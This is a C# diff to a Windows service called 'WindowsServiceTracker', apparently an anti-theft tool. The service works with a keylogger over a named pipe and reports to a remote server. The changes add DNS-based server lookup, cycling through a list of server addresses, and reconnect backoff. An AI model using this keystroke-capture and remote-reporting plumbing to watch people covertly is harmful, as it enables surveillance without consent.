@@ -47,11 +47,11 @@ namespace WindowsServiceTracker
         private const string ID_FILE = "ID.txt";
 
         //Variables
-        private volatile String ipAddressString = "127.0.0.1";
+        private String ipAddressString = "127.0.0.1";
+        private String domainName = "";
         private int port = 10011;
         private IPAddress ipAddress = new IPAddress(0x0100007F);// = 0x0100007F; //default to local host
-        private volatile IPEndPoint tcpIpPort;
-        private volatile IPEndPoint udpIpPort;
+        private volatile IPAddress[] ipList;
         private ChannelFactory<KeyloggerCommInterface> pipeFactory = new ChannelFactory<KeyloggerCommInterface>(
             new NetNamedPipeBinding(), new EndpointAddress("net.pipe://localhost/PipeKeylogger"));
         private KeyloggerCommInterface pipeProxy;
@@ -65,6 +65,7 @@ namespace WindowsServiceTracker
         // Variables in this block are intended to be used only with the thread
         // maintaining the tcp connection. They are not thread safe and should
         // not be used by other threads without making them volatile.
+        private IPEndPoint tcpIpPort;
         private NetworkStream tcpStream;
         private TcpClient tcp;
         private static bool reportedStolen = false;
@@ -72,6 +73,7 @@ namespace WindowsServiceTracker
         private int keylogFrequency = 20000; //todo up time on final release
         private Stopwatch pingStopwatch = new Stopwatch();
         private Stopwatch keylogStopwatch = new Stopwatch();
+        private int currentIP = 0;
 
         /* Constructor for the service. Currently only creates an event log source
          * that is used to output errors with in the windows event logs.
@@ -97,7 +99,7 @@ namespace WindowsServiceTracker
             //System.Diagnostics.Debugger.Launch();
 
             //Keep the service running for 15 seconds
-            //Thread.Sleep(15000); //todo remove for final release
+            Thread.Sleep(30000); //todo remove for final release
 
             //Sets the current directory to where the WindowsServiceTracker.exe is located rather
             //than some Windows folder that I couldn't seem to locate
@@ -111,28 +113,36 @@ namespace WindowsServiceTracker
             {
                 ipAddressString = Properties.Settings.Default.ServerIP;
                 port = Convert.ToInt32(Properties.Settings.Default.ServerPort);
+                domainName = Properties.Settings.Default.ServerDomain;
             }
             catch (ConfigurationException e)
-            {
-
-            }
+            {}
             catch (Exception e)
-            { 
-                
-            }
+            {}
 
-            //convert string IP to long
-            try
+            // get list of IPs from domain name
+            if (domainName.Length > 0)
             {
-                ipAddress = IPAddress.Parse(ipAddressString);
+                try
+                {
+                    ipList = Dns.GetHostAddresses(domainName);
+                }
+                catch
+                { }
             }
-            catch (Exception)
+
+            //convert string IP to long and use if domain name failed
+            if (ipList == null || ipList.Length == 0)
             {
-
+                try
+                {
+                    ipAddress = IPAddress.Parse(ipAddressString);
+                    ipList = new IPAddress[1];
+                    ipList[0] = ipAddress;
+                }
+                catch (Exception)
+                { }
             }
-
-            tcpIpPort = new IPEndPoint(ipAddress, port);
-            udpIpPort = new IPEndPoint(ipAddress, port);
 
             CreateOpenPipe();
             keyLogFilePath = GetKeylogFilePath();
@@ -287,10 +297,21 @@ namespace WindowsServiceTracker
                 {
                     try 
                     {
-                        tcpConnect();
-                        waitToConnect = 0;
-                        getTcpStream();
-                        SendStdMsg(macAddress, true);
+                        bool connected = tcpConnect();
+                        if (connected)
+                        {
+                            waitToConnect = 0;
+                            getTcpStream();
+                            SendStdMsg(macAddress, true);
+                        }
+                        else
+                        {
+                            Thread.Sleep(waitToConnect * 1000);
+                            if (waitToConnect < maxwaitBetweenConnects)
+                            {
+                                waitToConnect += 5;
+                            }
+                        }
                     }
                     catch (Exception)
                     {
@@ -376,16 +397,19 @@ namespace WindowsServiceTracker
          */
         private bool tcpConnect()
         {
-            try
-            {
-                tcp = new TcpClient();
+            tcpIpPort = new IPEndPoint(ipList[currentIP], port);
+            tcp = new TcpClient();
+            try {
                 tcp.Connect(tcpIpPort);
-                return true;
             }
-            catch (Exception)
+            catch{}
+            if (!tcp.Connected)
             {
-                throw new Exception("Error connecting");
+                currentIP++;
+                currentIP %= ipList.Length;
+                return false;
             }
+            return true;
         }
 
         /* Closes the TCP connection with the server
